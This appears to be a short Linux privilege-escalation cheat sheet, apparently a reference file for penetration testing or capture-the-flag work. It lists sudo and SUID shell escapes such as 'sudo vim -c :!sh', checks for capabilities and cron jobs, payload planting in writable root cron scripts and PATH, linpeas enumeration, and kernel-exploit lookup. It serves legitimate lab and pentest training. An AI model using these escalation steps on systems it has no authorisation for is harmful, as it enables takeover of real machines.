---
id: privesc-linux
title: Linux privesc — SUID, sudo, cron, kernel ordering
triggers: [suid, sudo -l, linpeas, /etc/crontab, capabilities, 4000]
---

## Order — cheapest wins first

1. `sudo -l` — anything `NOPASSWD` is usually the intended path:
   `(ALL) NOPASSWD: /usr/bin/vim` → `sudo vim -c ':!sh'` (GTFOBins).
2. `find / -perm -4000 2>/dev/null` — cross-check every hit against
   GTFOBins (`find`, `bash`, `cp`, `tar`, `python*`, `vim`, `less`,
   `env`, `nmap` with `--interactive`). `/usr/bin/env` → `env /bin/sh`.
3. `cat /etc/crontab` + `ls -la /etc/cron.*` — a root-owned cron job
   running a WORLD-WRITABLE script/path = write a payload, wait a minute.
4. `getcap -r / 2>/dev/null` — `cap_setuid`/`cap_dac_override` on
   python/perl/tar is a direct shell.

## Then enumerate

```bash
linpeas.sh | tee /tmp/linpeas.txt        # or upload + bash
id; uname -a; cat /etc/os-release
ls -la /home /root 2>/dev/null; find / -name "*.bak" -o -name "*.old" 2>/dev/null | head
ss -tlnp; ps aux | grep -v "^\w\+ \+[0-9]\+ [0-9.]* [0-9.]* \+[0-9]* \?[0-9]*"
```

- Writable service files / PATH-hijackable binaries run by root (systemd
  `ExecStart`, relative paths in root cron) → drop a same-named payload
  earlier in PATH or overwrite the script.
- Kernel exploit LAST — `searchsploit <kernel version>` only after the
  misconfig paths are dead ends; most training boxes are misconfig-shaped.
